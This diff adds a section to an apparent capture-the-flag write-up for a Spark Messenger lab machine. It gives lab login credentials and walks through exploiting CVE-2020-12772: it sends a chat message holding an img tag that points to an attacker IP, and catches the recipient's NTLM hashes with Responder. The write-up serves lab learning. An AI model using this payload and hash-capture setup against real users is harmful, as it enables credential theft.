@@ -48,3 +48,71 @@ java -cp "lib/*" org.jivesoftware.launcher.Startup
 
 
 
+## Logging in spark
+
+
+- Intreoduce the following data on the form:
+	Username: `lilyle`
+	Password: `ChangeMe#1234`
+	Domain: `fire.windcorp.thm`
+
+
+- Go to the advanced settings and disabled these options.
+	![[Spark Messenger-20250429111142019.webp]]
+	You are logged.
+	
+	![[Spark Messenger-20250429111333907.webp]]
+
+## Vulnerability
+
+If you look up on the internet you'll find an interesting `CVE-2020-12772` vulnerability.
+
+Visit https://nvd.nist.gov/vuln/detail/CVE-2020-12772.
+
+
+![[Screenshot from 2025-04-29 11-19-52.png]]
+
+## Explitation
+
+If you go to https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md you can see how the authors found the way of exploiting the vulnerability.
+
+![[Spark Messenger-20250429113402847.webp]]
+
+When you opened a chat with another user, you could send an `<img`  tag to that user with an external URL as the source of that image, like this:
+
+`<img src=http://<your attaching machine IP>/test.img>`
+
+Each time the user clicks the link, or the ROAR module automatically preloads it, the external server receives the request for the image, together with the NTLM hashes from the user that visits the link, i.e. the user you are chatting with!
+
+
+### Responder
+
+#Attacking_Machine 
+Run the following to be able to catch the hash when it comes.
+
+```
+sudo responder -I tun0
+
+```
+
+![[Spark Messenger-20250429113141404.webp]]
+
+
+## Start chat
+
+#sSpark
+- Go to Options->Start a Chat.
+
+	![[Spark Messenger-20250429115752719.webp]]
+
+-  After enter an address you'll have a window to chat.
+-  Send the message: `<img src=http://10.9.1.138/test.img>`.
+
+	![[Spark Messenger-20250429120805277.webp]]
+
+After a while you'll get the hash on the responder terminal.
+
+![[Spark Messenger-20250429121035765.webp]]
+
+**Next step:** [[Cracking the hash]]
+
